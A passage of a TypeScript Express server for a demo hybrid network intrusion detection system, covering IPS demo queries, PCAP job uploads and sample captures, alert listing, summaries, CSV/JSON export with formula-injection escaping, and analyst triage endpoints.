    if (clear_logs) {
      ipsState.recent_logs = [];
      ipsState.quarantined_ips = [];
      ipsState.blocked_ips = [];
      ipsState.stats = {
        total_queries: 0,
        safe_allowed: 0,
        attacks_unblocked: 0,
        attacks_blocked: 0,
        quarantine_drops: 0,
      };
    }
    res.json(ipsState);
  });

  app.get('/api/ips/catalog', (req, res) => {
    if (req.query.reset_quarantine === '1') {
      ipsState.quarantined_ips = [];
      ipsState.blocked_ips = [];
    }
    res.json({
      block_mode_enabled: ipsState.block_mode_enabled,
      queries: DEMO_QUERY_SUITE,
    });
  });

  app.post('/api/ips/query', async (req, res) => {
    const body = req.body as {
      scenario?: DemoQueryScenario;
      query_type?: 'SAFE' | 'ATTACK';
      label?: string;
      src_ip?: string;
      dst_ip?: string;
      dst_port?: number;
      payload_summary?: string;
    };
    const preset =
      DEMO_QUERY_SUITE.find((q) => q.scenario === body.scenario) || DEMO_QUERY_SUITE[0];

    const entry = await inspectAndRecordSingleIpsQuery({
      scenario: body.scenario || preset.scenario,
      query_type: body.query_type || preset.query_type,
      label: body.label || preset.label,
      src_ip: body.src_ip || preset.src_ip,
      dst_ip: body.dst_ip || preset.dst_ip,
      dst_port: body.dst_port || preset.dst_port,
      payload_summary: body.payload_summary || preset.payload_summary,
    });

    res.json({
      entry,
      ips_status: ipsState,
    });
  });

  app.post('/api/ips/run-suite', async (_req, res) => {
    const results: IpsQueryLogEntry[] = [];
    for (const q of DEMO_QUERY_SUITE) {
      results.push(await inspectAndRecordSingleIpsQuery(q));
    }
    res.json({
      status: ipsState,
      batch_results: results,
    });
  });

  // Helper endpoint to toggle Scenario D engine degradation states or reset
  app.post('/api/engine-config', requireAdminAuth, (req, res) => {
    const { suricata_unavailable, model_missing } = req.body as {
      suricata_unavailable?: boolean;
      model_missing?: boolean;
    };
    if (typeof suricata_unavailable === 'boolean') {
      runtimeSuricataUnavailable = suricata_unavailable;
    }
    if (typeof model_missing === 'boolean') {
      runtimeModelMissing = model_missing;
    }
    res.json(getHealthStatus());
  });

  // Helper endpoint to run a built-in sample PCAP from /samples directly
  app.post('/api/jobs/sample', async (req, res) => {
    const { sample_name } = req.body as { sample_name?: string };
    const allowed = ['attack_signature.pcap', 'suspicious_unmatched_ml.pcap', 'benign_traffic.pcap'];
    if (!sample_name || !allowed.includes(sample_name)) {
      res.status(400).json({ detail: `Invalid sample_name. Must be one of: ${allowed.join(', ')}` });
      return;
    }
    const samplePath = path.resolve(process.cwd(), 'samples', sample_name);
    if (!fs.existsSync(samplePath)) {
      res.status(404).json({ detail: `Sample file ${sample_name} not found.` });
      return;
    }
    try {
      const jobId = await runPcapJobPipeline(sample_name, fs.readFileSync(samplePath));
      res.json({ job_id: jobId });
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      res.status(400).json({ detail: msg });
    }
  });

  // Download built-in sample PCAP directly for live demonstration
  app.get('/api/samples/:filename', (req, res) => {
    const allowed = ['attack_signature.pcap', 'suspicious_unmatched_ml.pcap', 'benign_traffic.pcap'];
    const filename = req.params.filename;
    if (!allowed.includes(filename)) {
      res.status(404).json({ detail: `Invalid sample. Must be one of: ${allowed.join(', ')}` });
      return;
    }
    const samplePath = path.resolve(process.cwd(), 'samples', filename);
    if (!fs.existsSync(samplePath)) {
      res.status(404).json({ detail: `Sample file ${filename} not found on disk.` });
      return;
    }
    res.setHeader('Content-Type', 'application/vnd.tcpdump.pcap');
    res.download(samplePath, filename);
  });

  // 2. POST /api/jobs (multipart field "file", .pcap/.pcapng only, max 100 MB)
  app.post(
    '/api/jobs',
    express.raw({ type: (req) => Boolean(req.headers['content-type']?.includes('multipart/form-data')), limit: '105mb' }),
    async (req, res) => {
      try {
        const contentType = String(req.headers['content-type'] || '');
        if (!contentType.includes('multipart/form-data') || !Buffer.isBuffer(req.body)) {
          res.status(400).json({ detail: 'Expected multipart/form-data with field "file".' });
          return;
        }
        const { filename, fileBuffer } = parseMultipartFile(req.body, contentType);
        if (fileBuffer.length > MAX_UPLOAD_BYTES) {
          res.status(400).json({ detail: 'File exceeds maximum allowed size of 100 MB.' });
          return;
        }
        // Validate extension and header before creating job so invalid uploads return 400 with {"detail":"..."}
        extractFlowsFromPcapBuffer(filename, fileBuffer);
        const jobId = await runPcapJobPipeline(filename, fileBuffer);
        res.json({ job_id: jobId });
      } catch (err) {
        if (err instanceof PcapValidationError) {
          res.status(400).json({ detail: err.message });
          return;
        }
        const msg = err instanceof Error ? err.message : String(err);
        res.status(400).json({ detail: msg });
      }
    },
  );

  // 3. GET /api/jobs
  app.get('/api/jobs', (_req, res) => {
    const rows = db
      .prepare(
        `SELECT id, filename, status, created_at, total_flows, total_alerts, processing_time_ms, flows_per_sec, pcap_size_bytes
         FROM jobs
         ORDER BY created_at DESC`,
      )
      .all() as Array<Record<string, unknown>>;

    res.json(
      rows.map((r) => ({
        id: String(r.id),
        filename: String(r.filename),
        status: String(r.status),
        created_at: String(r.created_at),
        total_flows: Number(r.total_flows),
        total_alerts: Number(r.total_alerts),
        processing_time_ms: Number(r.processing_time_ms ?? 0),
        flows_per_sec: Number(r.flows_per_sec ?? 0),
        pcap_size_bytes: Number(r.pcap_size_bytes ?? 0),
      })),
    );
  });

  // 4. GET /api/jobs/:id
  app.get('/api/jobs/:id', (req, res) => {
    const row = db.prepare(`SELECT * FROM jobs WHERE id = ?`).get(req.params.id) as Record<string, unknown> | undefined;
    if (!row) {
      res.status(404).json({ detail: `Job '${req.params.id}' not found.` });
      return;
    }
    res.json({
      id: String(row.id),
      filename: String(row.filename),
      status: String(row.status),
      progress: Number(row.progress),
      error: row.error !== null && row.error !== undefined ? String(row.error) : null,
      engine_status: {
        suricata: (row.suricata_status as 'ok' | 'unavailable') || 'ok',
        model: (row.model_status as 'ok' | 'missing') || 'ok',
      },
      created_at: String(row.created_at),
      total_flows: Number(row.total_flows),
      total_alerts: Number(row.total_alerts),
      signature_alerts: Number(row.signature_alerts),
      ml_alerts: Number(row.ml_alerts),
      processing_time_ms: Number(row.processing_time_ms ?? 0),
      flows_per_sec: Number(row.flows_per_sec ?? 0),
      pcap_size_bytes: Number(row.pcap_size_bytes ?? 0),
    });
  });

  // 5. GET /api/jobs/:id/export?format=csv|json
  app.get('/api/jobs/:id/export', (req, res) => {
    const jobRow = db.prepare(`SELECT id, filename FROM jobs WHERE id = ?`).get(req.params.id) as
      | Record<string, unknown>
      | undefined;
    if (!jobRow) {
      res.status(404).json({ detail: `Job '${req.params.id}' not found.` });
      return;
    }
    const format = String(req.query.format || 'json').toLowerCase();
    const rows = db
      .prepare(`SELECT * FROM alerts WHERE job_id = ? ORDER BY risk_score DESC, timestamp DESC`)
      .all(req.params.id) as Array<Record<string, unknown>>;
    const alerts = rows.map(rowToAlert);

    if (format === 'csv') {
      const headers = [
        'id',
        'job_id',
        'timestamp',
        'src_ip',
        'src_port',
        'dst_ip',
        'dst_port',
        'protocol',
        'detection_method',
        'signature_id',
        'signature_msg',
        'ml_label',
        'ml_probability',
        'risk_score',
        'category',
        'rule_version',
        'model_version',
        'explanation',
      ];
      const csvLines = [headers.join(',')];
      for (const a of alerts) {
        const vals = headers.map((h) => {
          const v = a[h as keyof Alert];
          if (v === null || v === undefined) return '';
          let str = String(v);
          if (/^[=+\-@\t\r]/.test(str)) {
            str = `'${str}`;
          }
          str = str.replace(/"/g, '""');
          return str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r') ? `"${str}"` : str;
        });
        csvLines.push(vals.join(','));
      }
      res.setHeader('Content-Type', 'text/csv; charset=utf-8');
      res.setHeader('Content-Disposition', `attachment; filename="alerts_${req.params.id}.csv"`);
      res.send(csvLines.join('\n'));
      return;
    }

    res.setHeader('Content-Type', 'application/json; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="alerts_${req.params.id}.json"`);
    res.send(JSON.stringify(alerts, null, 2));
  });

  // 6. GET /api/summary?job_id=optional
  app.get('/api/summary', (req, res) => {
    const jobId = typeof req.query.job_id === 'string' && req.query.job_id.trim() !== '' ? req.query.job_id.trim() : null;

    let totalFlows = 0;
    if (jobId) {
      const fRow = db.prepare(`SELECT total_flows FROM jobs WHERE id = ?`).get(jobId) as { total_flows?: number } | undefined;
      totalFlows = Number(fRow?.total_flows ?? 0);
    } else {
      const fRow = db.prepare(`SELECT COALESCE(SUM(total_flows), 0) as s FROM jobs`).get() as { s: number };
      totalFlows = Number(fRow.s);
    }

    const alertRows = (
      jobId
        ? db.prepare(`SELECT * FROM alerts WHERE job_id = ? ORDER BY timestamp ASC`).all(jobId)
        : db.prepare(`SELECT * FROM alerts ORDER BY timestamp ASC`).all()
    ) as Array<Record<string, unknown>>;

    const byCategory = { Low: 0, Medium: 0, High: 0, Critical: 0 };
    const byMethod = { signature: 0, ml: 0 };
    const ipCounts = new Map<string, number>();
    const timeBuckets = new Map<string, number>();

    for (const r of alertRows) {
      const cat = String(r.category) as keyof typeof byCategory;
      if (cat in byCategory) byCategory[cat] += 1;

      const method = String(r.detection_method) as keyof typeof byMethod;
      if (method in byMethod) byMethod[method] += 1;

      const sip = String(r.src_ip);
      ipCounts.set(sip, (ipCounts.get(sip) || 0) + 1);

      const tsStr = String(r.timestamp);
      // Group alerts into clean 1-minute time windows (HH:MM) to prevent cluttered X-axis collisions
      const bucket = tsStr.length >= 16 ? tsStr.slice(11, 16) : tsStr;
      timeBuckets.set(bucket, (timeBuckets.get(bucket) || 0) + 1);
    }

    const topSourceIps = Array.from(ipCounts.entries())
      .map(([ip, count]) => ({ ip, count }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 5);

    // Keep chronological order and cap to the most recent 14 intervals for visual clarity
    const timeline = Array.from(timeBuckets.entries())
      .map(([time, count]) => ({ time, count }))
      .slice(-14);

    res.json({
      total_flows: totalFlows,
      total_alerts: alertRows.length,
      by_category: byCategory,
      by_method: byMethod,
      top_source_ips: topSourceIps,
      timeline,
    });
  });

  // 7. GET /api/alerts?job_id=&category=&method=&search=&page=1&page_size=20
  app.get('/api/alerts', (req, res) => {
    const jobId = typeof req.query.job_id === 'string' ? req.query.job_id.trim() : '';
    const category = typeof req.query.category === 'string' ? req.query.category.trim() : '';
    const method = typeof req.query.method === 'string' ? req.query.method.trim() : '';
    const search = typeof req.query.search === 'string' ? req.query.search.trim().toLowerCase() : '';
    const page = Math.max(1, parseInt(String(req.query.page || '1'), 10) || 1);
    const pageSize = Math.max(1, Math.min(100, parseInt(String(req.query.page_size || '20'), 10) || 20));

    const clauses: string[] = [];
    const params: Array<string | number> = [];

    if (jobId) {
      clauses.push('job_id = ?');
      params.push(jobId);
    }
    if (category) {
      clauses.push('category = ?');
      params.push(category);
    }
    if (method) {
      clauses.push('detection_method = ?');
      params.push(method);
    }
    if (search) {
      clauses.push(
        '(LOWER(src_ip) LIKE ? OR LOWER(dst_ip) LIKE ? OR LOWER(COALESCE(signature_msg, "")) LIKE ? OR LOWER(COALESCE(signature_id, "")) LIKE ? OR LOWER(COALESCE(ml_label, "")) LIKE ?)',
      );
      const pat = `%${search}%`;
      params.push(pat, pat, pat, pat, pat);
    }

    const whereSql = clauses.length > 0 ? `WHERE ${clauses.join(' AND ')}` : '';
    const countRow = db.prepare(`SELECT COUNT(*) as total FROM alerts ${whereSql}`).get(...params) as { total: number };
    const total = Number(countRow.total);

    const offset = (page - 1) * pageSize;
    const rows = db
      .prepare(`SELECT * FROM alerts ${whereSql} ORDER BY risk_score DESC, timestamp DESC LIMIT ? OFFSET ?`)
      .all(...params, pageSize, offset) as Array<Record<string, unknown>>;

    res.json({
      items: rows.map(rowToAlert),
      total,
      page,
      page_size: pageSize,
    });
  });

  // 8. GET /api/alerts/:id
  app.get('/api/alerts/:id', (req, res) => {
    const row = db.prepare(`SELECT * FROM alerts WHERE id = ?`).get(req.params.id) as Record<string, unknown> | undefined;
    if (!row) {
      res.status(404).json({ detail: `Alert '${req.params.id}' not found.` });
      return;
    }
    res.json(rowToAlert(row));
  });

  // 8b. PATCH /api/alerts/:id/triage (Analyst Feedback Loop: Confirm Threat / Mark False Positive)
  app.patch('/api/alerts/:id/triage', requireAdminAuth, (req, res) => {
    const row = db.prepare(`SELECT * FROM alerts WHERE id = ?`).get(req.params.id) as Record<string, unknown> | undefined;
    if (!row) {
      res.status(404).json({ detail: `Alert '${req.params.id}' not found.` });
      return;
    }
    const { analyst_status, analyst_notes } = req.body as {
      analyst_status?: 'open' | 'confirmed' | 'false_positive';
      analyst_notes?: string;
    };
    const validStatuses = ['open', 'confirmed', 'false_positive'];
    const nextStatus =
      analyst_status && validStatuses.includes(analyst_status)
        ? analyst_status
        : String(row.analyst_status || 'open');
    const nextNotes =
      analyst_notes !== undefined
        ? analyst_notes
        : row.analyst_notes !== null && row.analyst_notes !== undefined
          ? String(row.analyst_notes)
          : null;

    db.prepare(`UPDATE alerts SET analyst_status = ?, analyst_notes = ? WHERE id = ?`).run(
      nextStatus,
      nextNotes,
      req.params.id,
    );
    const updatedRow = db.prepare(`SELECT * FROM alerts WHERE id = ?`).get(req.params.id) as Record<string, unknown>;
    res.json(rowToAlert(updatedRow));
  });

  // 9. GET /api/evaluation
  app.get('/api/evaluation', (_req, res) => {
    if (!fs.existsSync(EVAL_PATH)) {
      res.status(404).json({ detail: 'No evaluation found. Run the training script first.' });
      return;
    }
    const evalData = JSON.parse(fs.readFileSync(EVAL_PATH, 'utf-8'));
    res.json(evalData);
  });

  // OpenAPI JSON spec at /docs/openapi.json & interactive HTML overview at /docs
  app.get('/docs', (_req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(`<!doctype html>
<html>
<head><title>Hybrid IDS - OpenAPI Documentation</title>
<style>body{font-family:system-ui,sans-serif;max-width:920px;margin:2rem auto;padding:0 1rem;color:#0f172a;background:#f8fafc}code{background:#e2e8f0;padding:2px 6px;border-radius:4px}.ep{background:#fff;border:1px solid #e2e8f0;border-radius:8px;padding:12px 16px;margin-bottom:10px}</style>
</head>
<body>
<h1>Hybrid Network Intrusion Detection System — REST API (/api)</h1>
<p>Authoritative contract endpoints active on this server:</p>
<div class="ep"><strong>GET</strong> <code>/api/health</code> — Engine status (Suricata, ML Model, SQLite Database)</div>
<div class="ep"><strong>POST</strong> <code>/api/jobs</code> — Multipart PCAP/PCAPNG upload (max 100 MB)</div>
<div class="ep"><strong>GET</strong> <code>/api/jobs</code> — List all analysis jobs</div>
<div class="ep"><strong>GET</strong> <code>/api/jobs/{id}</code> — Job progress, engine_status, flow & alert counts</div>
<div class="ep"><strong>GET</strong> <code>/api/jobs/{id}/export?format=csv|json</code> — Download job alerts</div>
<div class="ep"><strong>GET</strong> <code>/api/summary?job_id=optional</code> — Aggregated dashboard metrics & timeline</div>
<div class="ep"><strong>GET</strong> <code>/api/alerts?job_id=&category=&method=&search=&page=1&page_size=20</code> — Paginated alerts sorted by risk_score desc</div>
<div class="ep"><strong>GET</strong> <code>/api/alerts/{id}</code> — Full alert detail & 4-component risk breakdown</div>
<div class="ep"><strong>GET</strong> <code>/api/evaluation</code> — Held-out CICIDS2017 evaluation metrics & confusion matrix</div>
</body></html>`);
  });

  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Hybrid IDS Server listening on http://localhost:${PORT}`);
  });
}

startServer();
